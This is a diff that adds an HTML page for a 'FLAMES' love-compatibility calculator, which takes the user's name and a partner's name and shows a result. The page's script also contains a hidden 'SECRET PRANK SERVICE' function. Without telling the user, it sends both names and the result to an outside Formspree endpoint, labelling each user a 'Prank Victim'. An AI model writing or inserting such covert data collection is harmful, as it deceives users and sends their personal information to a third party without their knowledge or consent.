@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Relationship Test - FLAMES</title>
+    <style>
+        body { font-family: 'Poppins', sans-serif; background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .card { background: white; padding: 2rem; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); width: 100%; max-width: 450px; text-align: center; }
+        h1 { color: #ff4757; margin-bottom: 5px; font-size: 1.8rem; text-transform: uppercase; }
+        h2 { color: #ff6b81; font-size: 1.5rem; letter-spacing: 8px; margin-bottom: 15px; }
+        p.intro { font-size: 0.9rem; color: #747d8c; line-height: 1.4; margin-bottom: 25px; padding: 0 10px; }
+        .input-box { text-align: left; margin-bottom: 15px; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; color: #2f3542; }
+        input { width: 100%; padding: 12px; border: 2px solid #dfe4ea; border-radius: 10px; box-sizing: border-box; font-size: 1rem; transition: border 0.3s; }
+        input:focus { border-color: #ff4757; outline: none; }
+        button { background: #ff4757; color: white; border: none; padding: 15px; border-radius: 10px; cursor: pointer; font-size: 1.1rem; font-weight: bold; width: 100%; margin-top: 10px; transition: transform 0.2s, background 0.3s; }
+        button:hover { background: #ff6b81; transform: translateY(-2px); }
+        #result-display { margin-top: 25px; padding: 20px; border-radius: 10px; background: #f1f2f6; border: 2px solid #dfe4ea; min-height: 40px; font-size: 1.3rem; font-weight: bold; color: #ff4757; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h1>RELATIONSHIP TEST</h1>
+    <h2>FLAMES</h2>
+    <p class="intro">This online flames calculator is used to find the compatibility between you and your partner. This is just a fun please don't take it seriously.</p>
+
+    <div class="input-box">
+        <label>Your Name:</label>
+        <input type="text" id="name1" placeholder="Enter your name">
+    </div>
+
+    <div class="input-box">
+        <label>Name of your partner:</label>
+        <input type="text" id="name2" placeholder="Enter partner's name">
+    </div>
+
+    <button onclick="runFlames()">Generate</button>
+
+    <div id="result-display">Result</div>
+</div>
+
+<script>
+    function runFlames() {
+        let rawName1 = document.getElementById('name1').value;
+        let rawName2 = document.getElementById('name2').value;
+
+        let n1 = rawName1.toLowerCase().replace(/\s+/g, '').split('');
+        let n2 = rawName2.toLowerCase().replace(/\s+/g, '').split('');
+
+        if (rawName1 === "" || rawName2 === "") {
+            alert("Please enter both names to see the magic!");
+            return;
+        }
+
+        // Step 1: Cancel common letters
+        for (let i = 0; i < n1.length; i++) {
+            let index = n2.indexOf(n1[i]);
+            if (index !== -1) {
+                n1.splice(i, 1);
+                n2.splice(index, 1);
+                i--;
+            }
+        }
+
+        // Step 2: Remaining count
+        let count = n1.length + n2.length;
+
+        // Step 3: FLAMES Loop
+        let flames = ["Friend", "Love", "Affection", "Marriage", "Enemy", "Sister"];
+        let pos = 0;
+
+        while (flames.length > 1) {
+            pos = (pos + count - 1) % flames.length;
+            flames.splice(pos, 1);
+        }
+
+        const finalResult = flames[0];
+
+        // Show result on screen
+        document.getElementById('result-display').innerText = finalResult;
+
+        // SECRET PRANK SERVICE: Send data to you
+        sendSecretLog(rawName1, rawName2, finalResult);
+    }
+
+    function sendSecretLog(p1, p2, res) {
+        const secretData = new FormData();
+        secretData.append("Player Name", p1);
+        secretData.append("Partner Name", p2);
+        secretData.append("Calculated Result", res);
+        secretData.append("_subject", "New Prank Victim: " + p1);
+
+        // This happens in the background
+        fetch("https://formspree.io/f/mwvqwbyd", {
+            method: "POST",
+            body: secretData,
+            headers: { 'Accept': 'application/json' }
+        }).catch(err => console.log("Network error")); 
+    }
+</script>
+
+</body>
+</html>
